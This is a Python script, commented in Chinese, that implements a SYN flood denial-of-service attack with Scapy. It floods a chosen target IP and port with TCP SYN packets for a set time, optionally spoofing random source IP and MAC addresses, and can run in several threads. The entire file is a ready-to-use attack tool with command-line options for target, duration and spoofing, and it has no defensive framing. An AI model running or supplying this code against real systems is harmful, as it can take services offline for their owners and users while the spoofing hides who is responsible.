from random import randint
from scapy.all import *
from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import Ether
import optparse  # 导入选项分析模块
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # 清除报错

count = 0

#SYN泛洪攻击
def syn_dos(add, port, sec, switch):  # 定义方法，传入目标IP地址，目标端口号，是否激活随机伪装
    start = time.time()  # 定义起始时间
    while True:
        source_port = random.randint(1024, 65535)   # 随机产生源端口
        init_sn = random.randint(1, 65535 * 63335)  # 随机产生初始化序列号
        # 随机IP地址
        source_ip = '.'.join([str(x) for x in map(lambda x: randint(1, 254), range(4))])
        # 定义随机mac地址
        mac = ":".join(["%02x" % x for x in map(lambda x: randint(0, 255), range(6))])
        # 发包
        if switch:  # 开启伪装
            sendp(Ether(src=mac) / IP(src=source_ip, dst=add) / TCP(dport=port, sport=source_port, flags=2, seq=init_sn), verbose=False)
        else:
            send(IP(dst=add) / TCP(dport=port, sport=source_port, flags=2, seq=init_sn), verbose=False)
        global count
        count += 1
        end = time.time()  # 定义结束时间
        timing = end - start
        sys.stdout.write(f"\r攻击剩余时间:{int(sec - timing)}, 发包数:{count}")
        sys.stdout.flush()  # 刷新缓存
        if timing >= sec:  # 时间大于等于指定时间结束循环
            break


def option():
    # 配置帮助信息
    usage = "-h 显示帮助手册"
    parser = optparse.OptionParser(usage)

    # 选项‘-d’，指定目标地址
    parser.add_option('-d', "--address", dest='add', type='string', help='指定目标地址')
    # 选项‘-p’，指定目的端口号
    parser.add_option('-p', "--port", dest='port', type='int', help='指定目标端口')
    # 选项‘-s’，指定攻击时间
    parser.add_option('-s', "--time", dest='sec', type='int', help='指定攻击持续时间(默认30秒),单位秒。', default=30)
    # 选项‘-m’，开启随机伪装
    parser.add_option('-m', "--mask", dest='random', type='int', help='开启ip和mac伪装', default=1)
    # -t 线程,默认不开启
    parser.add_option('-t', "--thread", dest='thread', type='int', help='指定线程数', default=0)

    (options, args) = parser.parse_args()  # 分析参数，得到Options
    # 变量赋值！
    add = options.add
    port = options.port
    sec = options.sec
    ran = options.random
    thread = options.thread
    if thread:
        for i in range(thread):
            threading.Thread(target=syn_dos, args=(add, port, sec, ran)).start()
    else:
        syn_dos(add=add, port=port, sec=sec, switch=ran)


if __name__ == '__main__':
    option()
